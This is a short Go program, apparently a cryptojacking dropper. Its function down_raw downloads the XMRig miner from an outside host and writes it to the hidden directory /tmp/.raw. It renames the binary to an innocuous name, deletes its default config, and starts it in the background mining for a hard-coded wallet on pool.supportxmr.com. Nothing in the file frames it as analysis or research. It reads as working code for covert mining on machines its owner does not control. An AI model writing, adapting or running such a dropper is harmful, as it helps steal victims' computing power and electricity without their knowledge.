package main



import (

"fmt"
"os/exec"
"net/http"
"io/ioutil"
"os"
)









func  down_raw() {




fmt.Println("abaixando o xmrig  bruto")

url := "--url  pool.supportxmr.com:9000"

user :=  "--user  4Ary8uo817nZAjKXPtgRLf1XUVn1KXUp5WDBUrjDfctwGpirSoxKqBNRnRsgp7ha5vGxXD2u8maGMTezRzjaXrizTp2xYFy" 

pass :=  "--pass kiidie"

dl :=   "--donate-level 1"

tls :=  "--tls"



config :=  fmt.Sprintf(   "%s %s %s %s %s" , url , user , pass , dl , tls)

r ,  e    :=  http.NewRequest("GET" , "https://download.xmrig.com/xmrig/6.9.0/072881e1a1214befdd46f5823f4ba7afeb14136a/xmrig-6.9.0-linux-x64.tar.gz" , nil)

      if e != nil {

            fmt.Println("erro em down raw" )

            return 

             }


         r.SetBasicAuth("xmrig" , "download")

          cli  := http.Client{}

           rr , ee :=  cli.Do(r)

              if ee  == nil   {

                rrr ,   eee :=   ioutil.ReadAll(rr.Body)


                   if eee == nil  { 

                        os.MkdirAll("/tmp/.raw" , 0777)



                          ioutil.WriteFile("/tmp/.raw/vkzmn.raw" ,  rrr ,  0777 )





rrrr :=  exec.Command("sh"  ,  "-c" , "cd /tmp/.raw ; tar  -xf *raw ; cd *.0 ; rm config.json ; mv xmrig vkzmn ; ./vkzmn " + config )



rrrr.Start()




  }




}  

                     
}


